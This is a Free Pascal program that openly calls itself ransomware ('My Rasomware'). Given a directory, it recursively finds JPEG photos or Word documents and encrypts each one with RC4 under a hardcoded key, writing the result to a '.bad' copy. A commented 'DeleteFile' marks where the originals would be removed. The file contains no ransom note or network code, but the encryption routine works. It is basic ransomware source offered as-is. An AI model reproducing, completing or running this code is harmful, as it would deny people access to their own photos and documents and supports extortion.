program prasomlpr;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}
  cthreads,
  {$ENDIF}
  Classes, SysUtils, CustApp, fileutil,
  DCPrc4, DCPsha1
  { you can add units after this };

type

  { TRasomware }

  TRasomware = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure Listarfotos(directorio:utf8String );
    procedure Listardocum(directorio:utf8String );
  end;

{ TRasomware }

procedure TRasomware.DoRun;
var
  ErrorMsg: String;
  ruta: utf8String;
begin
  // parse parameters
  // DeleteFile
  if HasOption('l', 'lpath') then begin
    ruta := getOptionValue('l','lpath');
  end;

  if not DirectoryExists(ruta) then begin
    Terminate;
    Exit;
  end;

  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  if HasOption('p', 'photo') then begin
    Listarfotos(ruta);
    Terminate;
    Exit;
  end;

  if HasOption('d', 'doc') then begin
    Listardocum(ruta);
    Terminate;
    Exit;
  end;

  { add your program here }

  // stop program loop
  Terminate;
end;

constructor TRasomware.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor TRasomware.Destroy;
begin
  inherited Destroy;
end;

procedure TRasomware.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
end;
procedure TRasomware.ListarFotos(directorio:utf8String);
var
  i : integer;
  listafotos: TStringList;
  Cipher: TDCP_rc4;
  Source, Dest: TFileStream;
begin
  { add your help code here }
  listafotos := FindAllFiles(directorio, '*.jpg;', true);
  for i:= 0 to  listafotos.Count -1 do
  begin
    Cipher:= TDCP_rc4.Create(Self);
    Cipher.InitStr('12345678',TDCP_sha1);
    Source:= TFileStream.Create(listafotos.Strings[i],fmOpenRead);
    Dest:= TFileStream.Create(listafotos.Strings[i]+'.bad',fmCreate);
    Cipher.EncryptStream(Source,Dest,Source.Size);
    writeln(listafotos.Strings[i]);
    Cipher.Burn;
    Cipher.Free;
    Dest.Free;
    Source.Free;
  end;
end;
procedure TRasomware.Listardocum(directorio:utf8String);
var
  i : integer;
  listadocs: TStringList;
  Cipher: TDCP_rc4;
  Source, Dest: TFileStream;
begin
  { add your help code here }
  listadocs := FindAllFiles(directorio, '*.doc;*.docx', true);
  for i:= 0 to  listadocs.Count -1 do
  begin
    Cipher:= TDCP_rc4.Create(Self);
    Cipher.InitStr('12345678',TDCP_sha1);
    Source:= TFileStream.Create(listadocs.Strings[i],fmOpenRead);
    Dest:= TFileStream.Create(listadocs.Strings[i]+'.bad',fmCreate);
    Cipher.EncryptStream(Source,Dest,Source.Size);
    writeln(listadocs.Strings[i]);
    Cipher.Burn;
    Cipher.Free;
    Dest.Free;
    Source.Free;
  end;
end;

var
  Application: TRasomware;
begin
  Application:=TRasomware.Create(nil);
  Application.Title:='My Rasomware';
  Application.Run;
  Application.Free;
end.

